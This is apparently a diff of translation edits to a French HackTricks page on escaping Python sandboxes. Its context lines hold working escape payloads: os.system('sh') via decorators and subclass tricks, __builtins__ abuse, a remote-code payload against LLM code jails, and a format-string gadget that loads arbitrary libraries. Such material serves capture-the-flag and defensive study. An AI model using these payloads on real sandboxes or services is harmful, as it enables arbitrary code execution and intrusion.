@@ -17,15 +17,15 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 
 <figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-**Obtenez la perspective d'un hacker sur vos applications web, votre réseau et le cloud**
+**Obtenez la perspective d'un hacker sur vos applications web, votre réseau et votre cloud**
 
 **Trouvez et signalez des vulnérabilités critiques et exploitables ayant un impact commercial réel.** Utilisez nos 20+ outils personnalisés pour cartographier la surface d'attaque, trouver des problèmes de sécurité qui vous permettent d'escalader les privilèges, et utilisez des exploits automatisés pour collecter des preuves essentielles, transformant votre travail acharné en rapports convaincants.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
-Voici quelques astuces pour contourner les protections des sandboxes Python et exécuter des commandes arbitraires.
+Ce sont quelques astuces pour contourner les protections des sandboxes Python et exécuter des commandes arbitraires.
 
-## Bibliothèques d'exécution de commandes
+## Command Execution Libraries
 
 La première chose que vous devez savoir est si vous pouvez exécuter directement du code avec une bibliothèque déjà importée, ou si vous pourriez importer l'une de ces bibliothèques :
 ```python
@@ -160,7 +160,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Bypassing protections through encodings (UTF-7)
 
-Dans [**ce rapport**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy), UFT-7 est utilisé pour charger et exécuter du code python arbitraire à l'intérieur d'un apparent sandbox :
+Dans [**ce rapport**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy), l'UFT-7 est utilisé pour charger et exécuter du code python arbitraire à l'intérieur d'un apparent sandbox :
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -175,7 +175,7 @@ Il est également possible de le contourner en utilisant d'autres encodages, par
 
 ## Exécution Python sans appels
 
-Si vous êtes à l'intérieur d'une prison python qui **ne vous permet pas de faire des appels**, il existe encore des moyens d'**exécuter des fonctions, du code** et des **commandes arbitraires**.
+Si vous êtes dans une prison python qui **ne vous permet pas de faire des appels**, il existe encore des moyens d'**exécuter des fonctions, du code** et des **commandes arbitraires**.
 
 ### RCE avec [décorateurs](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -274,7 +274,7 @@ Sub['import os; os.system("sh")']
 ```
 #### Création d'objets avec des exceptions
 
-Lorsque une **exception est déclenchée**, un objet de **l'Exception** est **créé** sans que vous ayez besoin d'appeler le constructeur directement (un truc de [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
+Lorsque une **exception est déclenchée**, un objet de l'**Exception** est **créé** sans que vous ayez besoin d'appeler le constructeur directement (un truc de [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -337,7 +337,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### Pas de Builtins
 
-Lorsque vous n'avez pas `__builtins__`, vous ne pourrez pas importer quoi que ce soit ni même lire ou écrire des fichiers car **toutes les fonctions globales** (comme `open`, `import`, `print`...) **ne sont pas chargées**.\
+Lorsque vous n'avez pas `__builtins__`, vous ne pourrez rien importer ni même lire ou écrire des fichiers car **toutes les fonctions globales** (comme `open`, `import`, `print`...) **ne sont pas chargées**.\
 Cependant, **par défaut, python importe beaucoup de modules en mémoire**. Ces modules peuvent sembler bénins, mais certains d'entre eux **importent également des** fonctionnalités **dangereuses** à l'intérieur qui peuvent être accessibles pour obtenir même **une exécution de code arbitraire**.
 
 Dans les exemples suivants, vous pouvez observer comment **abuser** de certains de ces modules "**bénins**" chargés pour **accéder** à des **fonctionnalités** **dangereuses** à l'intérieur d'eux.
@@ -424,7 +424,7 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**Ci-dessous, il y a une fonction plus grande**](./#recursive-search-of-builtins-globals) pour trouver des dizaines/**centaines** de **lieux** où vous pouvez trouver les **globals**.
+[**Ci-dessous, il y a une plus grande fonction**](./#recursive-search-of-builtins-globals) pour trouver des dizaines/**centaines** de **lieux** où vous pouvez trouver les **globals**.
 
 ## Découvrir l'exécution arbitraire
 
@@ -561,7 +561,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Recherche Récursive des Builtins, Globals...
 
 {% hint style="warning" %}
-C'est juste **incroyable**. Si vous **cherchez un objet comme globals, builtins, open ou autre** utilisez simplement ce script pour **trouver de manière récursive les endroits où vous pouvez trouver cet objet.**
+C'est juste **incroyable**. Si vous **cherchez un objet comme globals, builtins, open ou autre**, utilisez simplement ce script pour **trouver de manière récursive les endroits où vous pouvez trouver cet objet.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -752,22 +752,22 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
-### Contournement des prisons LLM
+### LLM Jails bypass
 
-Depuis [ici](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
+From [here](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
 
-### Du format à l'exécution de code à distance en chargeant des bibliothèques
+### From format to RCE loading libraries
 
-Selon le [**challenge TypeMonkey de cet article**](https://corgi.rip/posts/buckeye-writeups/), il est possible de charger des bibliothèques arbitraires depuis le disque en abusant de la vulnérabilité de chaîne de format dans python.
+Selon le [**TypeMonkey chall de ce writeup**](https://corgi.rip/posts/buckeye-writeups/), il est possible de charger des bibliothèques arbitraires depuis le disque en abusant de la vulnérabilité de chaîne de format dans python.
 
 En rappel, chaque fois qu'une action est effectuée en python, une fonction est exécutée. Par exemple, `2*3` exécutera **`(2).mul(3)`** ou **`{'a':'b'}['a']`** sera **`{'a':'b'}.__getitem__('a')`**.
 
-Vous en avez plus comme ça dans la section [**Exécution Python sans appels**](./#python-execution-without-calls).
+Vous en avez plus comme ça dans la section [**Python execution without calls**](./#python-execution-without-calls).
 
-Une vulnérabilité de chaîne de format python ne permet pas d'exécuter de fonction (elle ne permet pas d'utiliser des parenthèses), donc il n'est pas possible d'obtenir une exécution de code à distance comme `'{0.system("/bin/sh")}'.format(os)`.\
-Cependant, il est possible d'utiliser `[]`. Par conséquent, si une bibliothèque python courante a une méthode **`__getitem__`** ou **`__getattr__`** qui exécute du code arbitraire, il est possible de les abuser pour obtenir une exécution de code à distance.
+Une vulnérabilité de chaîne de format python ne permet pas d'exécuter une fonction (elle ne permet pas d'utiliser des parenthèses), donc il n'est pas possible d'obtenir RCE comme `'{0.system("/bin/sh")}'.format(os)`.\
+Cependant, il est possible d'utiliser `[]`. Par conséquent, si une bibliothèque python courante a une méthode **`__getitem__`** ou **`__getattr__`** qui exécute du code arbitraire, il est possible de les abuser pour obtenir RCE.
 
-À la recherche d'un gadget comme ça en python, l'article propose cette [**requête de recherche Github**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Où il a trouvé celui-ci [ici](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
+À la recherche d'un gadget comme ça en python, le writeup propose cette [**requête de recherche Github**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Où il a trouvé celui-ci [ici](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -793,7 +793,7 @@ Ce gadget permet de **charger une bibliothèque depuis le disque**. Par conséqu
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
-Le défi abuse en réalité d'une autre vulnérabilité sur le serveur qui permet de créer des fichiers arbitraires sur le disque des serveurs.
+Le défi abuse en fait d'une autre vulnérabilité sur le serveur qui permet de créer des fichiers arbitraires sur le disque des serveurs.
 
 ## Dissection des objets Python
 
@@ -924,7 +924,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Remarquez que **si vous ne pouvez pas importer `dis` dans le sandbox python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et **le désassembler** localement. Vous ne verrez pas le contenu des variables étant chargées (`LOAD_CONST`), mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également le décalage de la variable étant chargée.
+Remarquez que **si vous ne pouvez pas importer `dis` dans le sandbox python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et **le désassembler** localement. Vous ne verrez pas le contenu des variables en cours de chargement (`LOAD_CONST`), mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également le décalage de la variable en cours de chargement.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -995,7 +995,7 @@ types.CodeType.__doc__
 ### Recréer une fonction divulguée
 
 {% hint style="warning" %}
-Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction directement à partir de l'objet de code de la fonction. Dans un **exemple réel**, toutes les **valeurs** pour exécuter la fonction **`code_type`** sont ce dont **vous aurez besoin pour leaker**.
+Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction directement à partir de l'objet de code de la fonction. Dans un **vrai exemple**, toutes les **valeurs** pour exécuter la fonction **`code_type`** sont ce que **vous devrez divulguer**.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1091,15 +1091,15 @@ will be bypassed
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
 {% hint style="success" %}
-Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Apprenez et pratiquez le Hacking AWS :<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le Hacking GCP : <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Soutenir HackTricks</summary>
 
 * Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
